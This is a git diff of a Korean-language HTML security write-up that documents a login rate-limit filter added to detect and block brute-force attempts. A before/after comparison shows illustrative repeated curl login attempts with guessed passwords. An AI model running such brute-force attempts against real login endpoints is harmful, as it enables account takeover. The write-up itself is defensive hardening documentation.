@@ -2432,6 +2879,21 @@ public ResponseEntity&lt;...&gt; handleTossPayment(TossPaymentException e) {
                                 </p>
                             </div>
 
+                            <div class="story">
+                                <div class="story-label">🔍 문제점 분석</div>
+                                <p>
+                                    로그인 API는 <strong>인터넷에 열려 있어야 하는 엔드포인트</strong>라 접근 자체를 막을 수 없습니다.
+                                    그런데 시도 횟수 제한이 없다 보니, 서버는 사람이 비밀번호를 잘못 친 것과
+                                    <span class="hl-red">자동화 도구가 초당 수백 번 두드리는 것을 구분하지 않았습니다.</span>
+                                </p>
+                                <p>
+                                    더 중요한 건 탐지 쪽입니다. 실패한 로그인은 한 건씩 떼어놓고 보면 그냥 오타처럼 보입니다.
+                                    <span class="hl-red">"같은 IP에서 5분 동안 수천 번"이라는 패턴을 보는 곳이 아무 데도 없었기 때문에,</span>
+                                    공격이 진행 중이어도 알 수 없고 지나간 뒤에도 흔적이 남지 않았습니다.
+                                    이것이 A09가 다루는 <strong>탐지 실패</strong>에 해당합니다.
+                                </p>
+                            </div>
+
                             <div class="flow">
                                 <div class="flow-item situation"><span class="step-label">📍 상황</span>관리자 로그인 API가 인터넷에
                                     공개되어 있음
@@ -2450,33 +2912,35 @@ public ResponseEntity&lt;...&gt; handleTossPayment(TossPaymentException e) {
                                 </div>
                             </div>
 
-                            <div class="compare">
-                                <div class="compare-box before">
-                                    <div class="compare-label">❌ 방어 없을 때</div>
-                                    <pre>공격자: curl -X POST /api/hq-auth/login
-  비밀번호: "password1"  → 실패
-  비밀번호: "password2"  → 실패
-  비밀번호: "password3"  → 실패
-  ... (무한 반복 가능)
+                            <div class="code-block">
+                                <div class="code-label"><span class="dot dot-r"></span><span
+                                        class="dot dot-y"></span><span class="dot dot-g"></span> 문제가 있던 코드 — 요청 횟수를 세는 코드가 없던 상태 (커밋 b3f4f35 이전)</div>
+                                <pre><code class="language-bash"># 적용 전에는 로그인 시도를 세는 필터가 아예 존재하지 않았습니다.
+$ git show b3f4f35^ --stat | grep -i ratelimit
+(출력 없음)      ← LoginRateLimitFilter.java 파일 자체가 없음
 
-로그: (아무 기록도 없음)</pre>
-                                </div>
-                                <div class="compare-box after">
-                                    <div class="compare-label">✅ 방어 적용 후</div>
-                                    <pre>공격자: curl -X POST /api/hq-auth/login
-  1~10회: 실패 응답
-  11회:   HTTP 429 (차단!)
-  12회~:  HTTP 429 (계속 차단)
+# 로그인 3개 경로 모두 아무 관문 없이 바로 인증 로직으로 들어갔습니다.
+POST /api/hq-auth/login                  → 시도 횟수 제한 없음
+POST /api/branch-auth/db-login           → 시도 횟수 제한 없음
+POST /api/branch-auth/firebase-session   → 시도 횟수 제한 없음
 
-로그: [WARN] 로그인 초과 차단 시작:
-  ip=공격자IP, 5분 내 11회째</pre>
-                                </div>
+# 실패해도 429가 아니라 401이 계속 돌아오고, 몇 번을 시도했는지는 아무도 세지 않았습니다.</code></pre>
+                            </div>
+
+                            <div class="improve">
+                                <div class="improve-title">🔧 적용 사항</div>
+                                <p>
+                                    1. <strong>LoginRateLimitFilter 신설</strong> — 로그인 3개 경로에만 적용해, 같은 IP가 5분 안에 10회를 넘기면 <code>HTTP 429</code>로 차단.<br>
+                                    2. <strong>차단이 시작되는 11회째에 딱 한 번만</strong> 경고 로그를 남김 — 공격은 탐지하되 로그 파일이 수만 줄로 폭주하지 않도록 함.<br>
+                                    3. 로그에 남기는 <strong>IP 값도 CrlfUtils로 정제</strong> — 사용자가 조작할 수 있는 값이므로 ②의 방어를 여기서도 적용.<br>
+                                    4. nginx 뒤에서는 모든 요청이 프록시 IP로 보이므로, <code>X-Forwarded-For</code>로 <strong>실제 클라이언트 IP를 복원</strong>해 집계.
+                                </p>
                             </div>
 
                             <div class="code-block">
                                 <div class="code-label"><span class="dot dot-r"></span><span
                                         class="dot dot-y"></span><span class="dot dot-g"></span>
-                                    LoginRateLimitFilter.java — 실제 코드</div>
+                                    실제 적용 코드 — LoginRateLimitFilter.java</div>
                                 <pre><code class="language-java">// 로그인 3개 경로에만 적용 (다른 API는 정상 통과)
 private static final Set&lt;String&gt; LIMITED_PATHS = Set.of(
         "/api/hq-auth/login",
@@ -2499,6 +2963,50 @@ if (updated.count() > MAX_ATTEMPTS) {
     response.getWriter().write("{\"message\":\"요청이 너무 많습니다. 잠시 후 다시 시도해주세요.\"}");
     return;
 }</code></pre>
+                            </div>
+
+                            <div class="story">
+                                <div class="story-label">🧪 실제 테스트 실행</div>
+                                <p>
+                                    같은 IP에서 로그인 API를 연속으로 호출하면서, <strong>몇 번째부터 차단되는지</strong>와
+                                    <strong>서버 로그에 무엇이 남는지</strong>를 함께 확인했습니다.
+                                </p>
+
+                                <div class="compare stacked">
+                                <div class="compare-box before">
+                                    <div class="compare-label">❌ 방어 없을 때</div>
+                                    <pre>공격자: curl -X POST /api/hq-auth/login
+  비밀번호: "password1"  → 실패
+  비밀번호: "password2"  → 실패
+  비밀번호: "password3"  → 실패
+  ... (무한 반복 가능)
+
+로그: (아무 기록도 없음)</pre>
+                                </div>
+                                <div class="compare-box after">
+                                    <div class="compare-label">✅ 방어 적용 후</div>
+                                    <pre>공격자: curl -X POST /api/hq-auth/login
+  1~10회: 실패 응답
+  11회:   HTTP 429 (차단!)
+  12회~:  HTTP 429 (계속 차단)
+
+로그: [WARN] 로그인 초과 차단 시작:
+  ip=공격자IP, 5분 내 11회째</pre>
+                                </div>
+                                </div>
+                            </div>
+
+                            <div class="story">
+                                <div class="story-label">🏁 결론</div>
+                                <p>
+                                    무차별 대입을 <span class="hl-green">막는 것</span>과 <span class="hl-green">알아차리는 것</span>을 함께 얻었습니다.
+                                    11회째부터 요청이 차단되므로 시간을 들여도 비밀번호를 맞힐 수 없고,
+                                    동시에 그 시점에 경고 로그가 남아 <strong>공격이 있었다는 사실 자체가 기록</strong>됩니다.
+                                </p>
+                                <p>
+                                    A09의 핵심은 차단이 아니라 <strong>사고를 알아차릴 수 있는가</strong>인데,
+                                    이 필터는 차단과 탐지를 한자리에서 처리합니다. 이제 로그를 열면 "누가, 언제, 어디서 몇 번 시도했는지"가 남아 있습니다.
+                                </p>
                             </div>
 
                             <div class="summary">
@@ -2663,14 +3171,16 @@ turnstileToken 정상 생성
                         lightbox.showModal();
                     };
 
-                    document.querySelectorAll('.screenshot-item img').forEach((image) => {
+                    document.querySelectorAll('.screenshot-item img, .compare-box img').forEach((image) => {
                         const wrapper = document.createElement('div');
                         wrapper.className = 'zoomable-image';
                         image.parentNode.insertBefore(wrapper, image);
                         wrapper.appendChild(image);
 
                         const label = wrapper.closest('.screenshot-item')
-                            ?.querySelector('.screenshot-label')?.textContent.trim() || image.alt;
+                            ?.querySelector('.screenshot-label')?.textContent.trim()
+                            || wrapper.closest('.compare-box')
+                            ?.querySelector('.compare-label')?.textContent.trim() || image.alt;
                         const zoomButton = document.createElement('button');
                         zoomButton.type = 'button';
                         zoomButton.className = 'image-zoom-button';
